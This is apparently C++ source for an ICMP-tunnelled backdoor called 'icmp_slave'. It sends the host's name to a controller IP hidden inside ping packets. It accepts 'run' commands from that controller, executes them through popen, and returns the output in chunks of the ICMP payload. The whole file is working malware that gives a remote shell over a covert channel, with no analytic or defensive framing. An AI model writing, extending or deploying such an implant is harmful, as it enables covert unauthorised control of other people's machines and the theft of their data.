#include <cstdint>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <vector>
#include <thread>
#include <mutex>

#include <sys/socket.h>
#include <sys/stat.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <net/if.h>
#include <fcntl.h>

struct buffer
{
  int pos{ 0 };
  bool ready{ false };
  std::vector<uint8_t> data;
};

static buffer out_buf;
static buffer in_buf;
static std::mutex buffer_mutex;

static std::string beacon_msg;

static uint32_t id;

static uint16_t checksum(uint16_t *ptr, int nbytes)
{
  uint64_t sum;
  uint16_t oddbyte, rs;

  sum = 0;
  while (nbytes > 1) {
    sum += *ptr++;
    nbytes -= 2;
  }

  if (nbytes == 1) {
    oddbyte = 0;
    *((uint8_t *)&oddbyte) = *(uint8_t *)ptr;
    sum += oddbyte;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  rs = ~sum;
  return rs;
}

void handle_data()
{
  std::lock_guard<std::mutex> guard(buffer_mutex);
  std::string data{ (char *)in_buf.data.data(), in_buf.data.size() };

  std::cout << "Received: " << data << "\n";

  std::string cmd = data.substr(0, data.find(' '));
  std::string arg = data.substr(data.find(' ') + 1);

  if (cmd == "run") {
    std::cout << "Running command: " << arg << "\n";
    FILE *f;
    if (!(f = popen(arg.c_str(), "r"))) {
      return;
    }
    int d = fileno(f);
    fcntl(d, F_SETFL, O_NONBLOCK);


    uint8_t buf[512];
    ssize_t nbytes;
    while (1) {
      nbytes = read(d, buf, sizeof(buf));

      if (nbytes == -1 && errno == EAGAIN) {
        continue;
      } else if (nbytes > 0) {
        out_buf.data.insert(out_buf.data.end(), &buf[0], &buf[nbytes]);
      } else {
        break;
      }
    }

    out_buf.ready = true;

    pclose(f);
  }
  in_buf.data.clear();
}

void usage(int exit_code)
{
  puts("usage: icmp_slave [-h] interface dst_ip\n");
  exit(exit_code);
}

int main(int argc, char **argv)
{
  // Check args
  if (argc < 3) {
    usage(-1);
  }

  if (strcmp(argv[1], "-h") == 0) {
    usage(0);
  }

  char *opt = argv[1];
  char *dest_ip = argv[2];

  const size_t len = strnlen(opt, IFNAMSIZ);
  if (len == IFNAMSIZ) {
    std::fputs("Too long iface name", stderr);
    exit(-1);
  }

  sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(0);
  addr.sin_addr.s_addr = inet_addr(dest_ip);

  // Create the raw socket.
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1) {
    perror("socket");
    return -1;
  }

  char hostname[256];
  gethostname(hostname, sizeof(hostname));

  beacon_msg = hostname;

  setsockopt(sockfd, SOL_SOCKET, IP_RECVIF, opt, len);

  uint8_t out[sizeof(icmphdr) + 5 + 64];
  uint8_t in[1024];
  uint8_t flush = 0x00;

  while (1) {
    std::memset(out, 0, sizeof(out));
    std::memset(in, 0, sizeof(in));

    icmphdr *icmp = (icmphdr *)out;
    icmp->icmp_type = ICMP_ECHO;

    size_t packet_size = sizeof(icmphdr) + 4;

    if (id) {
      std::memcpy(&out[packet_size], &id, sizeof(id));
      packet_size += sizeof(id);
      packet_size += sizeof(flush);

      if (flush == 0x01) {
        flush = 0x00;
      }

      if (out_buf.ready && out_buf.pos < out_buf.data.size()) {
        std::lock_guard<std::mutex> guard(buffer_mutex);
        size_t to_write = (out_buf.data.size() - out_buf.pos) > 64 ? 64 : (out_buf.data.size() - out_buf.pos);
        std::memcpy(&out[packet_size], out_buf.data.data() + out_buf.pos, to_write);
        out_buf.pos += to_write;
        packet_size += to_write;
        flush = 0x00;
        if (out_buf.pos >= out_buf.data.size()) {
          std::puts("Flushing data to server!");
          out_buf.data.clear();
          out_buf.pos = 0;
          out_buf.ready = false;
          flush = 0x01;
        }
      } else {
        std::memcpy(&out[packet_size], beacon_msg.c_str(), beacon_msg.size());
        packet_size += beacon_msg.size();
        flush = 0x02;
      }

      std::memcpy(&out[sizeof(icmphdr) + 4 + sizeof(id)], &flush, sizeof(flush));
    }

    icmp->icmp_cksum = checksum((uint16_t *)icmp, packet_size);
    if (sendto(sockfd, icmp, packet_size, 0, (sockaddr *)&addr, sizeof(addr)) == -1) {
      perror("sendto");
      std::exit(-1);
    }

    size_t nbytes = read(sockfd, in, sizeof(in));
    if (nbytes <= sizeof(ip)) continue;
    nbytes -= sizeof(ip);

    ip *ip_ = (ip *)in;
    if (ip_->ip_src.s_addr != addr.sin_addr.s_addr) continue;

    if (nbytes <= sizeof(icmphdr) + 4) continue;
    nbytes -= sizeof(icmphdr);
    nbytes -= 4;

    icmp = (icmphdr *)(in + sizeof(ip));
    size_t index = sizeof(ip) + sizeof(icmphdr) + 4;

    if (!id) {
      std::memcpy(&id, &in[index], sizeof(id));
      std::cout << "Established connection with id=" << id << "\n";
      continue;
    }

    index += sizeof(id);
    nbytes -= sizeof(id);

    if (in[index] == 0x00 && nbytes != 1) {
      std::lock_guard<std::mutex> guard(buffer_mutex);
      in_buf.data.insert(in_buf.data.end(), &in[index + 1], &in[index + nbytes]);
    } else if (in[index] == 0x01) {
      std::thread handle_data_thread(handle_data);
      handle_data_thread.detach();
    }

    sleep(5);
  }

  return 0;
}